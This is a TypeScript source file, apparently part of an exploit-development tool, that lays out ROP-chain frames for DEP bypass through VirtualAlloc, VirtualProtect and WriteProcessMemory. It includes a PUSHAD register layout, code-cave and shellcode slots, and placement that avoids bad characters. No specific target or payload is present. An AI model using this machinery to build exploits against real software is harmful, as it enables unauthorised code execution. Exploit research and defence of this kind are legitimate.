import { Val, constVal } from "../rop/reach";
import { DepApi } from "./rop_template";

// Where each argument of the call comes from. One list of slots per API serves both styles: the skeleton
// writes each slot into a dword of the buffer, PUSHAD pushes each slot from the register it names.
//
// This is the one place that says what a call needs, so the jobs a style is judged on are read off the
// same table the chain is built from. A style refused for lacking a job its API never asks for is a
// refusal the table can disprove.
export type Source =
  | { kind: "api" }
  | { kind: "shellcode" }
  | { kind: "size" }
  | { kind: "const"; value: number }
  | { kind: "named"; name: "WRITABLE" | "CAVE" }
  | { kind: "ropnop" }
  | { kind: "jmpesp" }
  | { kind: "skip3" }
  | { kind: "nops" };

export type Slot = { name: string; source: Source; register?: string };

const API: Source = { kind: "api" };
const SHELLCODE: Source = { kind: "shellcode" };
const WRITABLE: Source = { kind: "named", name: "WRITABLE" };
const CAVE: Source = { kind: "named", name: "CAVE" };
const c = (value: number): Source => ({ kind: "const", value });

export const FRAMES: Record<DepApi, Slot[]> = {
  VirtualAlloc: [
    { name: "VirtualAlloc", source: API }, { name: "return", source: SHELLCODE }, { name: "lpAddress", source: SHELLCODE },
    { name: "dwSize", source: { kind: "size" } }, { name: "flAllocationType", source: c(0x1000) }, { name: "flProtect", source: c(0x40) },
  ],
  VirtualProtect: [
    { name: "VirtualProtect", source: API }, { name: "return", source: SHELLCODE }, { name: "lpAddress", source: SHELLCODE },
    { name: "dwSize", source: c(0x201) }, { name: "flNewProtect", source: c(0x40) }, { name: "lpflOldProtect", source: WRITABLE },
  ],
  WriteProcessMemory: [
    { name: "WriteProcessMemory", source: API }, { name: "return", source: CAVE }, { name: "hProcess", source: c(0xffffffff) },
    { name: "lpBaseAddress", source: CAVE }, { name: "lpBuffer", source: SHELLCODE }, { name: "nSize", source: c(0x210) },
    { name: "lpNumberOfBytesWritten", source: WRITABLE },
  ],
};

// PUSHAD pushes EAX, ECX, EDX, EBX, the old ESP, EBP, ESI, EDI, so from ESP up the frame reads EDI first.
// For VirtualAlloc and VirtualProtect the old ESP lands on lpAddress, the first argument, and a stack address
// is what that argument wants. For WriteProcessMemory it would land on an argument that must be the cave, so
// EDI carries a gadget that skips the old ESP and the two registers around it and execution resumes at EBX.
// Slots are listed in the order the [4/7] pop jobs load them.
//
// WriteProcessMemory takes five arguments where PUSHAD has four registers to spare, so its frame runs two
// registers short and the rest of the call is dwords after the dispatch gadget. Those two registers are not
// loaded, so a module without a pop for them still takes the target: the job list is read off this table
// for exactly that reason.
export const PUSHAD_FRAMES: Record<DepApi, Slot[]> = {
  VirtualAlloc: [
    { name: "VirtualAlloc", source: API, register: "esi" }, { name: "return", source: { kind: "jmpesp" }, register: "ebp" },
    { name: "dwSize", source: c(0x1), register: "ebx" }, { name: "flAllocationType", source: c(0x1000), register: "edx" },
    { name: "flProtect", source: c(0x40), register: "ecx" }, { name: "ropnop", source: { kind: "ropnop" }, register: "edi" },
    { name: "nops", source: { kind: "nops" }, register: "eax" },
  ],
  VirtualProtect: [
    { name: "VirtualProtect", source: API, register: "esi" }, { name: "return", source: { kind: "jmpesp" }, register: "ebp" },
    { name: "dwSize", source: c(0x201), register: "ebx" }, { name: "flNewProtect", source: c(0x40), register: "edx" },
    { name: "lpflOldProtect", source: WRITABLE, register: "ecx" }, { name: "ropnop", source: { kind: "ropnop" }, register: "edi" },
    { name: "nops", source: { kind: "nops" }, register: "eax" },
  ],
  WriteProcessMemory: [
    { name: "WriteProcessMemory", source: API, register: "ebx" }, { name: "return", source: CAVE, register: "edx" },
    { name: "hProcess", source: c(0xffffffff), register: "ecx" }, { name: "skip3", source: { kind: "skip3" }, register: "edi" },
    { name: "lpBaseAddress", source: CAVE, register: "eax" },
  ],
};

export const PUSHAD_TAIL: Record<DepApi, Slot[]> = {
  VirtualAlloc: [],
  VirtualProtect: [],
  WriteProcessMemory: [{ name: "lpBuffer", source: SHELLCODE }, { name: "nSize", source: c(0x210) }, { name: "lpNumberOfBytesWritten", source: WRITABLE },
  ],
};

/** The addresses a frame needs, each measured by the run and none of them guessable: the first four are
 * what its slots hold, `staging` is where a staged frame is laid. */
export type FrameFacts = { iatSlot?: number; delta?: number; writable?: number; cave?: number; staging?: number };

/** The dwords a staged chain pops off the frame's base, as offsets from it. One per field, shifted back
 * by the write gadget's own displacement, because a gadget that stores to `[reg+4]` is handed the field's
 * address minus four; and the pivot's, shifted back by the dwords the pivot takes off the new stack
 * before its ret, so that ret lands on field 1. Which gadgets those are is the run's answer, so where a
 * staged frame can go is not a property of the frame alone. */
export function stagedPops(api: DepApi, writeOffset: number, pivotPops: number): number[] {
  return [...FRAMES[api].map((_, i) => 4 * i - writeOffset), 0 - 4 * pivotPops];
}

/** Where a staged frame can be laid inside one run of writable bytes, or undefined when nowhere in it
 * can. The frame is read as dwords by the call it dispatches, so its base is dword-aligned and its whole
 * span has to fit the run. The chain pops each of `pops`, relative to that base, and sends it as it is,
 * so every one of those addresses has to be free of the bad chars; they are not the frame's own bytes and
 * need not be writable. One clean address at the head of a long run proves nothing about the rest, which
 * is why this walks the run a dword at a time instead of testing it once. */
export function stagingBase(run: { at: number; size: number }, span: number, pops: number[], bad: number[]): number | undefined {
  const clean = (value: number): boolean => [0, 8, 16, 24].every((shift) => bad.indexOf((value >>> shift) & 0xff) < 0);
  for (let base = Math.ceil(run.at / 4) * 4; base + span <= run.at + run.size; base += 4) {
    if (pops.every((offset) => clean(base + offset))) return base;
  }
  return undefined;
}

/** What a slot asks the search to leave in a register, for the slots whose value is a number or a dword in
 * memory. A slot whose value is frame arithmetic (the shellcode's address on the stack), one the emitted
 * script chooses at run time (the size), or one named after a gadget the corpus has to supply (the ROP NOP,
 * the jump into the stack, the dword skipper) has no goal here: the first two are not values to search for
 * and the last three are known only once the corpus is in hand. */
export function frameGoal(slot: Slot, facts: FrameFacts): Val | undefined {
  switch (slot.source.kind) {
    case "api":
      return facts.iatSlot === undefined ? undefined
        : { mem: { at: facts.iatSlot, text: "IAT_SLOT" }, k: facts.delta ?? 0, text: facts.delta === undefined ? "0" : "API_DELTA" };
    case "const":
      return constVal(slot.source.value);
    case "named": {
      const value = slot.source.name === "WRITABLE" ? facts.writable : facts.cave;
      return value === undefined ? undefined : constVal(value, slot.source.name);
    }
    case "nops":
      return constVal(0x90909090);
    default:
      return undefined;
  }
}
